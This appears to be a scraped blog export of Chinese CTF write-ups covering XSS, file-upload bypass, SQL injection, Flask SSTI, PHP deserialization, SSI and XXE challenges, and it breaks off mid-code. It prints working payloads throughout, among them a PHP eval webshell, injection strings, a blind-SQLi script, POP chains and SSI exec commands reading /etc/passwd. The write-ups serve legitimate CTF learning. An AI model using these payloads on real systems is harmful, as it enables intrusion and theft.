1&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt; HTML实体编码命名实体：以&amp;开头，以分号结尾，例如&lt;的编码为 “&amp;lt”字符编码: 十进制，十六进制ASCII码或Unicode字符编码，样式为”&amp;#数值”例如”&lt;”可以编码为”&amp;#060;“和&amp;#x3c 123&lt;ahref=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt; URL编码123&lt;ahref=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt; 实战——dvwamedium中级阶段是过滤了&lt;script&gt;标签这里有两种绕过方法：1.使用其他类型的标签，例如&lt;img&gt;2.复写标签，跟sql注入的绕过一样，因为他这里也是值替换一次 high这里就是完全过滤script，复写也没用，所以就是用其他类型的标签进行绕过就行了 impossible记得们之前提过，控制字符被转化为实体编码，被解码后会被当做普通字符，这里将所有的控制字符都转码了，所以我们输入的语句就都不会被执行了。","link":"/2021/01/28/XSS%E6%BC%8F%E6%B4%9E/"},{"title":"bugku3","text":"web34提示说是文件包含漏洞，果然是，遍历了一次目录，没有什么收获，用御剑扫了一下，发现有一个文件上传的后台，上传一句话木马，发现被过滤了&lt;?php ?&gt; 想想有没有替代方式，突然想起来之前好像有个帖子说可以不用&lt;?php 1&lt;scrpit language=php&gt;xxxxxxxx&lt;/script&gt; 构造一句话木马: 1&lt;script language=&quot;php&quot;&gt;@eval($_POST['cmd'])&lt;/script&gt; 但是蚁剑连接一直报错转换方法：使用system指令直接查找 1&lt;script language=php&gt;system(&quot;find / -name flag*&quot;);&lt;/script&gt; 然后file/flag 就可以获得flag web32这是文件上传题，过滤了php文件包括其他文件这里复习一下几个绕过吧: 00截断：不行，最终的文件名是不可控的，它会自动加上.jpg使用其他后缀进行绕过，例如php4，并修改Content-Type，也就是修改MIME，但是还是不行，查了一下说是上面也有一处Content-Type: multipart，后面multipart有的字母改大写，但是不是很理解为什么 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;html&gt;&lt;body&gt;&lt;?php $flag = &quot;flag{test}&quot;?&gt;&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;My name is margin,give me a image file not a php&lt;br&gt;&lt;br&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;?phpfunction global_filter(){ $type = $_SERVER[&quot;CONTENT_TYPE&quot;]; if (strpos($type,&quot;multipart/form-data&quot;) !== False){ $file_ext = substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], '.')+1); $file_ext = strtolower($file_ext); if (stripos($file_ext,&quot;php&quot;) !== False){ die(&quot;Invalid File&lt;br /&gt;&quot;); } }}?&gt;&lt;?phpglobal_filter();if ((stripos($_FILES[&quot;file&quot;][&quot;type&quot;],'image')!== False) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 10*1024*1024)){ if ($_FILES[&quot;file&quot;][&quot;error&quot;] == 0){ $file_ext = substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], '.')+1); $file_ext = strtolower($file_ext); $allowexts = array('jpg','gif','jpeg','bmp','php4'); if(!in_array($file_ext,$allowexts)){ die(&quot;give me a image file not a php&quot;); } $_FILES[&quot;file&quot;][&quot;name&quot;]=&quot;bugku&quot;.date('dHis').&quot;_&quot;.rand(1000,9999).&quot;.&quot;.$file_ext; if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])){ echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &lt;br /&gt;&quot;; } else{ if (!file_exists('./upload/')){ mkdir (&quot;./upload/&quot;); system(&quot;chmod 777 /var/www/html/upload&quot;); } move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;Upload Success&lt;br&gt;&quot;; $filepath = &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; echo &quot;Stored in: &quot; .&quot;&lt;a href='&quot; . $filepath . &quot;' target='_blank'&gt;&quot; . $filepath . &quot;&lt;br /&gt;&quot;; } }}else{ if($_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 0){ echo &quot;You was catched! :) &lt;br /&gt;&quot;; }}?&gt;&lt;/body&gt;&lt;/html&gt; 收获:看了源码，原来，这题他就是故意要在那边弄一个判断，strpos区分大小写，所以multipart/form-data更改大小写就可以绕过了，你没改有的大小写，你就无法上传成功，感觉蛮无语的，就是让我们猜嘛，猜对就对了，算是收获了:不要把思维仅仅局限在过往的任何一个知识点上，任何地方可能都存在过滤，然后这题还是白名单，合着就是让我们猜php4== web33写解密算法 web31扫描后台，得到一个robots.txt，打开后得到 然后打开那个php 说我不是管理员，然后下面说要get x，我就让x=admin试试，就可以了。。。跟学长小小吐槽了一下其中的莫名其妙后，发现果然还是自己太年轻，其实其中逻辑性推理性还挺强的，这题首先他说你不是管理员，然后下面说get的x==password，这个时候其实我们会想，什么x会等于password啊，题目说我们不是管理员，就是在暗示我们password可能=admin，这其实考察的也是弱密码，所以也没什么地方值得无语的。 web351234567891011121314&lt;?phperror_reporting(0);$KEY='ctf.bugku.com';include_once(&quot;flag.php&quot;);$cookie = $_COOKIE['BUGKU'];if(isset($_GET['25112'])){ show_source(__FILE__);}elseif (unserialize($cookie) === &quot;$KEY&quot;)//这个unserialize是反序列化{ echo &quot;$flag&quot;;}else {?&gt; 在小角落找到一个 try ?25112，得到以上代码，让我们一起康康：他说存在flag.php，但是打开什么也没有再往下看，他说get一个值，就是25112，然后再将cookie反序列化===key，那么我们这里就将ctf.bugku.com序列化试试得到s:13:&quot;ctf.bugku.com&quot;;然后回到开始页面，burpsuit抓包，让cookie那一栏的值为 BUGKU=s:13:”ctf.bugku.com” 即可要成为一个好的ctfer 眼神也是要好啊，不然这个 try ?25112真滴没找到","link":"/2021/01/31/bugku3/"},{"title":"buuctf1","text":"Warm——up 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950 &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can't see it&quot;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr(//mb_substr() 函数返回字符串的一部分 $page, 0, mb_strpos($page . '?', '?')//mb_strpos()查找 string 在一个 string 中首次出现的位置。 ); //假设我们的page是123.php，最后通过mb_substr截取的内容即为123.php if (in_array($_page, $whitelist)) {//这边进行弱类型比较 return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can't see it&quot;; return false; } } if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt; 打开hint.php，看到flag在ffffllllaaaagggg，如何打开呢？将代码放到phpstorm审计一下： 代码中有一个include文件包含函数，我们需要让判断进入到这个语句当中， 本来以这题是in_array绕过，但是发现，in_array的弱类型比较中，只有当haystack为数字时，needle才会自动被转化为数字，实现绕过。但是这里比较的对象为字符，弱类型比较在这里就行不通。往下看 使用了一个mb_substr的函数（由于配置使用mb函数，所以这里改为substr效果一样），我们会发现下面in_array比较的对象变成是？前面的内容，然后这里返回的是true不是$_page的值，也就是说我们可以在?号后面拼接一个文件名回到题目拼接试试： 这题出乎意料的挺简单的。。。后面的urldecode完全没用到。。。 下一题吧 EASYSQLadmin’or 1=1#即可 随便注1有注入点，看了一下源码，说sqlmap没有灵魂– 说明可以用sqlmap扫出来，那就等一下这里过滤了select 意味着基本上所有注入语句都用不了，尝试使用堆叠注入，（好久没用了），因为堆叠注入可以不使用select 直接 用 use show之类的指令查了一下，payload: 11';use supersqli;show tables; 1';use supersqli;show columns from `1919810931114514`; 这里一开始直接查询查询不出来，看了wp，发现需要加了反引号以后才可以查询，在mysql中尝试了一下，发现这个1919810931114514是一个关键字，所以需要加``参考:https://www.cnblogs.com/yangzailu/p/6694000.html接下来继续往下: 发现flag，如何查询列名呢？： 这里找到一种方法: 11';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1; 这个方法很巧妙啊，首先使用concat拼接语句，这样绕过select的检查，然后 set一个（这里就叫变量吧，比较好理解）储存其中 接下来使用prepare预处理 最后使用execute执行参考https://www.cnblogs.com/geaozhang/p/9891338.html参考：https://dev.mysql.com/doc/refman/8.0/en/execute.html 1flag{47b4a012-1ccf-42b7-865d-529d431e6676} Havefun12345$cat=$_GET['cat']; echo $cat; if($cat=='dog'){ echo 'Syc{cat_cat_cat_cat}'; } 额直接?cat=dog就出来了。。。FLAG_TABLE EasySQL依旧是堆叠注入： 11;show databases; 11;use ctf;show columns; 有一个ctf接下来不管用什么语句都过不去了，于是看了一下wp，发现是有源码的，但是我扫了以后发现是没有内容的？于是看到源码中: 1$sql = &quot;select &quot;.$post['query'].&quot;||flag from Flag&quot;; 这里使用mysql进行测试一下:这里的||是表示或 所以我们其实可以这么看这个语句:我们查询FLag表内的内容可以是: 1select * from FLag 所以我们可以用个，进行分割表示select两段内容: 可以发现 这里的||和&&成了运算符连接了我们不需要的内容，构成一个整体代入查询展示： **解法二（官方解法）** 有一个设置，可以将||管道符变成连接符而不是运算符Oracle 在缺省情况下支持使用 `\" || \"`连接字符串 ， **但是在MySQL中缺省不支持** ，MySQL 缺省使用 CONCAT 系列函数来连接字符串 . 可以通过修改 sql_mode 模式 : PIPES_AS_CONCAT 来实现将 &quot; || &quot;视为 字符串连接符 而非 或 运算符 . 因此这里预期的 Payload 是通过修改 sql_mode 来拿到 Flag ，如下 Payload : 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 拼接后就变成了 SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag include1文件包含+封装协议，之前写过了: 1php://filter/read=convert.base64-encode/resource=flag.php Secret File1 1234567891011&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag放在了flag.php里?&gt; 依旧使用php://filter封装协议。。。。 1php://filter/read=convert.base64-encode/resource=flag.php","link":"/2021/03/15/buuctf/"},{"title":"buuctf10","text":"[WesternCTF2018]shrine 1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) python ssti注入 过滤()还有config以及self，由于过滤了括号，所以刚学的设置变量的方法在这里就不能使用了，看一下别人wp的思路吧:app.config[‘FLAG’] = os.environ.pop(‘FLAG’) 首先这里说flag在config这个文件里面，那么如何查看这个变量呢？这里介绍两个函数:url_for和get_flashed_message通过这两个函数，来查询现在app内的全局变量。(get_flashed_messages函数返回之前在Flask中通过flash()传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用get_flashed_messages()方法取出，闪现信息只能取出一次，取出后闪现信息会被清空。) __globals__ function.__globals__，用于获取function所处空间下可使用的module、方法以及所有变量。该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。 有了这两个知识点 我们就可以构造payload: 123{{get_flashed_message.__globals__.}}//'current_app': &lt;Flask 'app'&gt;,{{get_flashed_message.__globals__['current_app'].config}}{{url_for.__globals__['current_app'].config}} 需要注意的是 当你使用了get_flashed_message以后 查询出一次将不会再查询出第二次了 思路小结:查看源码，发现flag在app的config的配置文件中——思考如何在()被过滤的情况下获取flag变量——globals可以获得所有变量——如何读取？——寻找可读取变量的函数。 [SWPU2019]Web1 存在sql注入 不过是MariaDB数据库而不是mysql数据库，测试了一下发现空格被过滤 使用/**/进行绕过 并且union select没被过滤所以使用联合注入: 1-1'union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 1-1'union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 查询得到数据库名 由于or被过滤，所以这里学习一下 查询表的库总结在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS、sys.schema_auto_increment_columns、mysel.innodb_table_stats记录着表结构 本题查询表的payload: 1-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 ads,users 无列名注入: PS:为啥后面有个a呢？因为，进行嵌套查询的时候子查询出来的的结果是作为一个派生表来进行上一级的查询的，所以子查询的结果必须要有一个别名 把MySQL语句改成：select * from (select * from ……) as 别名; as可以省略:所以此时我们就可进行无列明注入了:本题payload: 1-1'/**/union/**/select/**/1,(select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/union/**/select*from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 2,flag,admin,admin1 1-1'/**/union/**/select/**/1,(select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 1-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 这里我们是定义了表为b 并且将后面的查询到的数据暂时存入该表中 [WUSTCTF2020]朴实无华robots.txt里面发现一个fakeflag，然后打开包发现fl4g.php打开发现源码Look_at_me: /fl4g.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader('Content-type:text/html;charset=utf-8');error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET['num'])){ $num = $_GET['num']; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){ echo &quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;; }else{ die(&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;); }}else{ die(&quot;鍘婚潪娲插惂&quot;);}//level 2if (isset($_GET['md5'])){ $md5=$_GET['md5']; if ($md5==md5($md5)) echo &quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;; else die(&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;);}else{ die(&quot;鍘婚潪娲插惂&quot;);}//get flagif (isset($_GET['get_flag'])){ $get_flag = $_GET['get_flag']; if(!strstr($get_flag,&quot; &quot;)){ $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;; system($get_flag); }else{ die(&quot;蹇埌闈炴床浜�&quot;); }}else{ die(&quot;鍘婚潪娲插惂&quot;);}?&gt; 1fl4g.php?num=0x1234&amp;md5=0e215962017&amp;get_flag=more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag 不能使用cat，用more代替 不能使用空格，可以用之前用到的$IFS$9代替 先使用ls命令查到flag的位置 众所周知linux中命令cat、more、less均可用来查看文件内容，主要区别有：新学的知识点cat是一次性显示整个文件的内容，还可以将多个文件连接起来显示，它常与重定向符号配合使用，适用于文件内容少的情况；more和less一般用于显示文件内容超过一屏的内容，并且提供翻页的功能。more比cat强大，提供分页显示的功能，less比more更强大，提供翻页，跳转，查找等命令。而且more和less都支持：用空格显示下一页，按键b显示上一页。下面详细介绍这3个命令。https://blog.csdn.net/xyw_blog/article/details/16861681","link":"/2021/04/15/buuctf10/"},{"title":"buuctf11","text":"[网鼎杯 2020 朱雀组]Nmap本题应该考察nmap的指令参数注入，记得之前有做个类似的题目: 123host='&lt;?=eval($_GET[a]);?&gt; -oN flag.phtml '' -iL /flag -oN flag.txt ' [MRCTF2020]PYWebsite源码有个/flag.php 然后点进去看到说什么保存了购买者的ip，如果是购买者才能买，那就伪造一下IP，payload： 1X-Forwarded-For: 127.0.0.1 [极客大挑战 2019]FinalSQL盲注^符号进行绕过学习一下二分法进行盲注，所以直接用网上大神的脚本了: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import reimport requestsimport stringurl = &quot;http://bdd17c66-2f39-4c33-849e-abc1d04f19f2.node3.buuoj.cn/search.php&quot;flag = ''def payload(i, j): # 数据库名字 #sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j) # 表名 # sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))&gt;%d)^1&quot;%(i,j) # 列名 # sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)^1&quot;%(i,j) # 查询flag sql = &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; % (i, j) data = {&quot;id&quot;: sql} r = requests.get(url, params=data) # print (r.url) if &quot;Click&quot; in r.text: res = 1 else: res = 0 return resdef exp(): global flag for i in range(1, 10000): print(i, ':') low = 31 high = 127 while low &lt;= high: mid = (low + high) // 2 res = payload(i, mid) if res: low = mid + 1 else: high = mid - 1 f = int((low + high + 1)) // 2 if (f == 127 or f == 31): break # print (f) flag += chr(f) print(flag)exp()print('flag=', flag) 学习一波，因为二分法的速度会快一倍！ flag跑了三次才正确？不懂为啥 [NPUCTF2020]ReadlezPHP抓包看回显 有提示/time.php?source有源码 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp{ public $a; public $b; public function __construct(){ $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; } public function __destruct(){ $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); }}$c = new HelloPhp;if(isset($_GET['source'])){ highlight_file(__FILE__); die(0);}@$ppp = unserialize($_GET[&quot;data&quot;]); 构造一个反序列化函数就行了， 1 发现eval无法执行？可能是有过滤吧，所以这里引入一个assert函数：assert函数 功能是判断一个表达式是否成立，返回true or false，重点是函数会执行此表达式。如果表达式为函数如assert(“echo(1)”)，则会输出1，而如果为assert(“echo 1;”)则不会有输出。 123456789101112131415161718192021222324&lt;?php#error_reporting(0);class HelloPhp{ public $a; public $b; public function __construct() { $this-&gt;a = &quot;assert&quot;; $this-&gt;b = &quot;phpinfo()&quot;; } public function __destruct() { $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); }}$c = new HelloPhp;print(serialize($c)); [BJDCTF2020]EasySearchswp源码泄露 123456789101112131415161718192021222324252627282930313233343536&lt;?php ob_start(); function get_hash(){ $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(&quot;Content-Type:text/html;charset=utf-8&quot;); *** if(isset($_POST['username']) and $_POST['username'] != '' ) { $admin = '6d0bc1'; if ( $admin == substr(md5($_POST['password']),0,6)) { echo &quot;&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = ' *** *** &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt; *** ***'; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; } else { echo &quot;&lt;script&gt;alert('[!] Failed')&lt;/script&gt;&quot;; }else { *** } ***?&gt; hash碰撞小脚本绕过第一个判断: 1234567import hashlibfor num in range(10000,9999999999): res=hashlib.md5(str(num).encode()).hexdigest() if res[0:6]==&quot;6d0bc1&quot;: print(str(num)) break 然后就直接用账号密码登录，抓包登录界面，就会发现一个文件网页链接:可以看到旁边有个public啥的，点入就可以发现 当然，这里用到一个新学的知识： ssi注入SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。 从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。 1.2 SSI语法 首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来。 ①显示服务器端环境变量&lt;#echo&gt; 本文档名称： 123456789&lt;!–#echo var=&quot;DOCUMENT_NAME&quot;–&gt;现在时间：&lt;!–#echo var=&quot;DATE_LOCAL&quot;–&gt;显示IP地址：&lt;! #echo var=&quot;REMOTE_ADDR&quot;–&gt; ②**将文本内容直接插入到文档中&lt;#include&gt;** 1234567&lt;! #include file=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;index.html&quot; --&gt;&lt;! #include virtual=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt; 注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径 ③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等) 1234567文件最近更新日期：&lt;! #flastmod file=&quot;文件名称&quot;–&gt;文件的长度：&lt;!–#fsize file=&quot;文件名称&quot;–&gt; ④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序) 1234567&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt; 将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。 ⑤设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式) ⑥高级SSI可设置变量使用if条件语句。 SSI挖掘思路两个思路： 1.从业务场景来Fuzz，比如获取IP、定位、时间等2.识别页面是否包含.stm,.shtm和.shtml后缀这里是shtml后缀文件名，故思考是否存在ssi注入，发现用户名可控会被写入 123&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;&lt;!--#exec cmd=&quot;cat /&quot;--&gt;username=&lt;!--#exec cmd=&quot;ls ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666 [MRCTF2020]Ezpop1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-&gt;append($this-&gt;var); }}class Show{ public $source; public $str; public function __construct($file='index.php'){ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.&quot;&lt;br&gt;&quot;; } public function __toString(){ return $this-&gt;str-&gt;source; } public function __wakeup(){ if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ $function = $this-&gt;p; return $function(); }}if(isset($_GET['pop'])){ @unserialize($_GET['pop']);}else{ $a=new Show; highlight_file(__FILE__);} pop链构造题：有点无语，我在本地的时候可以成功拿到flag但是在网页就不行了？？ 123456789101112131415161718&lt;?phpclass Modifier{ public $var= &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}class show{ public $source; public $str;}class Test{ public $p;}$a=new Modifier();$b=new show();$c=new Test();$c-&gt;p=$a;$b-&gt;str=$c;$b-&gt;source=$b;print(urlencode(serialize($b)); 想了一下 好像是因为我的版本存在那个漏洞:**在php7.1+对类属性的检测不严格，所以可以用public来绕过 **所以我用了public的时候才可以成功，然后这里新学了一种姿势：如果是protect类型的话，其实可以在最后加一个urlencode来进行编码，这样输入进去的空白字符就会被url转码，在url中输入的时候也不会被吃掉:payload: 12O%3A4%3A%22show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D","link":"/2021/04/17/buuctf11/"},{"title":"buuctf12","text":"[NCTF2019]True XML cookbook依旧是xxe注入：但是这题flag不在根目录下没法直接读取，所以看了一下wp说是在内网主机中！？？？？？？？？？？果然还是做得题目少了，内网主机文件夹：读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 然后发现，接下来一个一个尝试就可以拿到flag了 附上一篇xxe注入的学习文章：https://xz.aliyun.com/t/3357#toc-11 [GYCTF2020]FlaskApp又是flask框架 注入 ，确定是jingjia模板注入： 报错爆出了网站的源码文件app.py，那就先来一波任意文件读取看行不行 1{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() }}{% endif %}{% endfor %} 1from flask import Flask,render_template_string from flask import render_template,request,flash,redirect,url_for from flask_wtf import FlaskForm from wtforms import StringField, SubmitField from wtforms.validators import DataRequired from flask_bootstrap import Bootstrap import base64 app = Flask(__name__) app.config['SECRET_KEY'] = 's_e_c_r_e_t_k_e_y' bootstrap = Bootstrap(app) class NameForm(FlaskForm): text = StringField('BASE64加密',validators= [DataRequired()]) submit = SubmitField('提交') class NameForm1(FlaskForm): text = StringField('BASE64解密',validators= [DataRequired()]) submit = SubmitField('提交') def waf(str): black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] for x in black_list : if x in str.lower() : return 1 @app.route('/hint',methods=['GET']) def hint(): txt = &quot;失败乃成功之母！！&quot; return render_template(&quot;hint.html&quot;,txt = txt) @app.route('/',methods=['POST','GET']) def encode(): if request.values.get('text') : text = request.values.get(&quot;text&quot;) text_decode = base64.b64encode(text.encode()) tmp = &quot;结果 :{0}&quot;.format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for('encode')) else : text = &quot;&quot; form = NameForm(text) return render_template(&quot;index.html&quot;,form = form ,method = &quot;加密&quot; ,img = &quot;flask.png&quot;) @app.route('/decode',methods=['POST','GET']) def decode(): if request.values.get('text') : text = request.values.get(&quot;text&quot;) text_decode = base64.b64decode(text.encode()) tmp = &quot;结果 ： {0}&quot;.format(text_decode.decode()) if waf(tmp) : 